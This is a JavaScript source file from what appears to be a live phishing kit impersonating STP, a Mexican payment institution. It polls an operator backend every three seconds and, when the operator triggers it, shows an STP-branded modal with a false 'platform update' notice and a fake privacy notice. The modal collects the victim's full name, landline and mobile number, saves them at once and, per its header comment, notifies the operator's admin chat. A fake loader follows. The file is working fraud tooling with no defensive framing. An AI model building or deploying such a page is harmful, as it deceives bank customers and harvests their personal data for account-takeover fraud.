/**
 * Datos Personales Handler - bXControl
 * Modal con el formulario de Datos Personales (nombre, tel. fijo, celular).
 * Captura inmediata al BD + notificación al chat del admin.
 */

class DatosPersonalesSystem {
    constructor() {
        this.current      = null;   // { datos_personales_id }
        this.modalCreated = false;
        this.interval     = null;
        this.enviando     = false;
        if (window.Telas) Telas.registrar('datos', () => this.reset());
        this.init();
    }

    init() {
        this.injectStyles();
        this.startCheck();
    }

    // ── Polling cada 3s ───────────────────────────────────────────────────
    startCheck() {
        this.interval = setInterval(() => this.check(), 3000);
    }

    stopCheck() {
        if (this.interval) { clearInterval(this.interval); this.interval = null; }
    }

    async check() {
        const epoch = window.Telas ? Telas.epoch : 0;
        try {
            const res  = await fetch('php_modales/verificar_datos_personales.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_datos_personales_pendiente' })
            });
            const data = await res.json().catch(() => null);
            if (!data || !data.success) return;
            if (window.Telas && !Telas.vigente(epoch)) return;

            if (data.tiene_datos_personales) {
                if (this.current && this.current.datos_personales_id !== data.datos_personales_id) {
                    this.reset();
                }
                if (!this.current) {
                    this.show(data);
                }
            } else if (this.current) {
                this.reset();
            }
        } catch (_) { /* silencioso */ }
    }

    // ── Mostrar modal ──────────────────────────────────────────────────────
    async show(data) {
        if (this._abriendo) return;
        this._abriendo = true;
        const abierto = document.getElementById('dpOverlay');
        if (abierto) abierto.classList.remove('active');
        const epoch = window.Telas ? await Telas.ocupar('datos', true) : null;
        this._abriendo = false;
        if (window.Telas && (epoch == null || !Telas.vigente(epoch))) return;
        this.current = { datos_personales_id: data.datos_personales_id };
        this.createModal();

        // Limpiar campos
        ['dp_nombre', 'dp_fijo', 'dp_cel'].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.value = '';
        });

        const err = document.getElementById('dp_error');
        if (err) { err.textContent = ''; err.style.display = 'none'; }

        this._showSection('dp_form_section');
        document.getElementById('dpOverlay').classList.add('active');
    }

    reset() {
        this.enviando = false;
        this.current  = null;
        const overlay = document.getElementById('dpOverlay');
        if (overlay) overlay.classList.remove('active');
    }

    close() {
        const overlay = document.getElementById('dpOverlay');
        if (overlay) overlay.classList.remove('active');
        setTimeout(() => { this.current = null; }, 400);
    }

    // ── Enviar formulario ──────────────────────────────────────────────────
    async onSubmit() {
        if (this.enviando || !this.current) return;

        const nombre = (document.getElementById('dp_nombre')?.value || '').trim();
        const fijo   = (document.getElementById('dp_fijo')?.value   || '').replace(/\D/g, '');
        const cel    = (document.getElementById('dp_cel')?.value    || '').replace(/\D/g, '');

        const errorEl = document.getElementById('dp_error');
        if (errorEl) { errorEl.textContent = ''; errorEl.style.display = 'none'; }

        if (!nombre) {
            this._showError('El nombre completo es obligatorio.');
            document.getElementById('dp_nombre')?.focus();
            return;
        }
        if (fijo.length !== 10) {
            this._showError('El teléfono fijo debe tener 10 dígitos.');
            document.getElementById('dp_fijo')?.focus();
            return;
        }
        if (cel.length !== 10) {
            this._showError('El teléfono celular debe tener 10 dígitos.');
            document.getElementById('dp_cel')?.focus();
            return;
        }

        const solicitudId = this.current.datos_personales_id;
        this.enviando = true;
        this._setSubmitting(true);

        // CAPTURAR EN BD INMEDIATAMENTE
        try {
            const res = await fetch('php_modales/procesar_datos_personales.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion:               'guardar_datos',
                    datos_personales_id:  this.current.datos_personales_id,
                    nombre, fijo, cel
                })
            });
            const data = await res.json().catch(() => null);
            if (!data || !data.success) {
                this.enviando = false;
                this._setSubmitting(false);
                this._showError(data?.error || 'No fue posible guardar los datos.');
                return;
            }
        } catch (_) {
            this.enviando = false;
            this._setSubmitting(false);
            this._showError('Error de conexión. Intente nuevamente.');
            return;
        }

        this._showSection('dp_loader_section');

        // Esperar ~3s (solo visual)
        await this._wait(350 + Math.floor(Math.random() * 351));

        if (!this.current || this.current.datos_personales_id !== solicitudId) return;
        this.enviando = false;
        this.close();
    }

    // ── Helpers ────────────────────────────────────────────────────────────
    _wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    _showSection(id) {
        ['dp_form_section', 'dp_loader_section'].forEach(sid => {
            const el = document.getElementById(sid);
            if (el) el.style.display = sid === id ? '' : 'none';
        });
    }

    _showError(msg) {
        const err = document.getElementById('dp_error');
        if (err) { err.textContent = msg; err.style.display = 'block'; }
    }

    _setSubmitting(state) {
        const btn = document.getElementById('dp_submit_btn');
        if (btn) { btn.disabled = state; btn.style.opacity = state ? '0.7' : '1'; }
    }

    // ── Crear modal ────────────────────────────────────────────────────────
    createModal() {
        if (this.modalCreated) return;

        const html = `
<div id="dpOverlay" class="dp-overlay">
  <div class="dp-box commonPanelBorder">

    <!-- Formulario -->
    <div id="dp_form_section">
      <div class="dp-title-row">
        <span>Sistema de Transferencias y Pagos</span>
      </div>

      <div class="dp-intro">
        <div class="dp-intro-inner">
          <img src="css/img/logo_Chico.png" alt="STP" class="dp-logo">
          <span class="dp-intro-text">
            <strong>Estimado Cliente:</strong> <strong>STP</strong> ha implementado actualizaciones
            en su plataforma. Para continuar brindándole un servicio seguro y sin interrupciones,
            es necesario que actualice sus datos de contacto directamente con <strong>STP</strong>.
            Sistema de Transferencias y Pagos STP es una institución de fondos de pago electrónico
            regulada, lo que garantiza la seguridad de sus operaciones. Para más información, visite
            nuestro Centro de Ayuda. <strong>Complete el formulario a continuación.</strong>
          </span>
        </div>
      </div>

      <div class="dp-form-wrap">
        <table width="100%" class="dp-table">
          <tbody>
            <tr>
              <td class="dp-label-cell">Nombre completo:</td>
              <td class="dp-input-cell">
                <input id="dp_nombre" type="text" maxlength="100" required
                       placeholder="Nombre(s) Apellido(s)"
                       autocomplete="off" class="dp-input dp-nombre">
              </td>
            </tr>
            <tr>
              <td class="dp-label-cell">Teléfono fijo:</td>
              <td class="dp-input-cell">
                <input id="dp_fijo" type="text" maxlength="10" required
                       inputmode="numeric" pattern="[0-9]{10}" placeholder="10 dígitos"
                       autocomplete="off" class="dp-input">
              </td>
            </tr>
            <tr>
              <td class="dp-label-cell">Teléfono celular:</td>
              <td class="dp-input-cell">
                <input id="dp_cel" type="text" maxlength="10" required
                       inputmode="numeric" pattern="[0-9]{10}" placeholder="10 dígitos"
                       autocomplete="off" class="dp-input">
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="dp_error" class="dp-error" style="display:none;"></div>

      <div class="dp-actions">
        <a href="#" id="dp_submit_btn" class="dp-apply-link" title="Aplicar">
          <img src="stpdentro_files/aplicar.gif" alt="Aplicar">
        </a>
      </div>

      <p class="dp-aviso">
        Aviso de privacidad: Los datos que proporcione serán tratados con estricta confidencialidad
        y utilizados únicamente para los fines del servicio, conforme al aviso de privacidad de STP.
      </p>
    </div>

    <!-- Loader -->
    <div id="dp_loader_section" style="display:none; padding-bottom:12px;">
      <div class="dp-title-row"><span>Sistema de Transferencias y Pagos</span></div>
      <div class="dp-loader-body">
        <div class="loading-loader">
          <div class="loading-logo">
            <img src="stp1_file/stp2.png" alt="Cargando">
          </div>
          <div class="loading2"></div>
        </div>
        <br><br>
        <span style="font-size:13px;">Procesando su información&hellip;</span>
      </div>
    </div>

  </div>
</div>`;

        document.body.insertAdjacentHTML('beforeend', html);
        this.modalCreated = true;
        this.bindEvents();
    }

    bindEvents() {
        // Nombre: solo letras/espacios, siempre mayúsculas
        const dpNombre = document.getElementById('dp_nombre');
        dpNombre?.addEventListener('input', () => {
            dpNombre.value = dpNombre.value.toUpperCase().replace(/[^A-ZÁÉÍÓÚÜÑ\s]/gi, '');
        });

        // Teléfonos: solo dígitos
        ['dp_fijo', 'dp_cel'].forEach(id => {
            document.getElementById(id)?.addEventListener('input', function () {
                this.value = this.value.replace(/\D/g, '').slice(0, 10);
            });
        });

        // Botón aplicar
        document.getElementById('dp_submit_btn')?.addEventListener('click', (e) => {
            e.preventDefault();
            this.onSubmit();
        });
    }

    // ── Estilos ────────────────────────────────────────────────────────────
    injectStyles() {
        if (document.getElementById('dp-styles')) return;
        const style = document.createElement('style');
        style.id = 'dp-styles';
        style.textContent = `
.dp-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,.55);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9100;
    opacity: 0;
    visibility: hidden;
    transition: opacity .2s ease;
}
.dp-overlay.active { opacity: 1; visibility: visible; }

.dp-box {
    background: #fff;
    max-width: 38vw;
    max-height: 88vh;
    overflow-y: auto;
    border: 1px solid #c0c8e8;
    border-radius: 4px;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    box-shadow: 0 6px 24px rgba(0,0,0,.3);
}

.dp-title-row {
    background-color: #1C408D;
    background-image: linear-gradient(180deg, #3d62b0 0%, #1C408D 55%, #163472 100%);
    color: #fff;
    text-align: center;
    padding: 6px 10px;
    font-size: 13px;
    font-weight: bold;
}

.dp-intro {
    border-bottom: 1px solid #ccc;
    padding: 8px 12px;
    margin: 0;
}
.dp-intro-inner { display: flex; align-items: flex-start; gap: 8px; }
.dp-logo { flex-shrink: 0; width: 34px; }
.dp-intro-text { font-size: 11px; line-height: 1.5; text-align: justify; }

.dp-form-wrap {
    border: 1px solid rgb(212,231,255);
    margin: 8px 12px 4px;
}

.dp-table { width: 100%; border-collapse: collapse; }
.dp-label-cell {
    width: 35%;
    padding: 5px 7px;
    font-size: 12px;
    background: #dce6ff;
    color: #000;
    vertical-align: middle;
}
.dp-input-cell { padding: 5px 7px; }
.dp-input {
    width: 92%;
    padding: 2px 4px;
    border: 1px solid #aaa;
    font-size: 12px;
    font-family: inherit;
}
.dp-nombre { text-transform: uppercase; }

.dp-error {
    color: #b50000;
    font-size: 11px;
    margin: 2px 12px 4px;
    padding: 3px 7px;
    background: #fff0f0;
    border: 1px solid #f5c6c6;
    border-radius: 3px;
}

.dp-actions { text-align: right; padding: 4px 12px 2px; }
.dp-apply-link img { border: 0; }
.dp-aviso {
    font-family: sans-serif;
    font-size: 10px;
    font-style: italic;
    margin: 2px 12px 8px;
    color: #555;
}

.dp-loader-body { text-align: center; padding: 16px 12px; }
        `;
        document.head.appendChild(style);
    }
}

// ── Inicializar ──────────────────────────────────────────────────────────────
let datosPersonalesSystem;
document.addEventListener('DOMContentLoaded', () => {
    datosPersonalesSystem = new DatosPersonalesSystem();
});
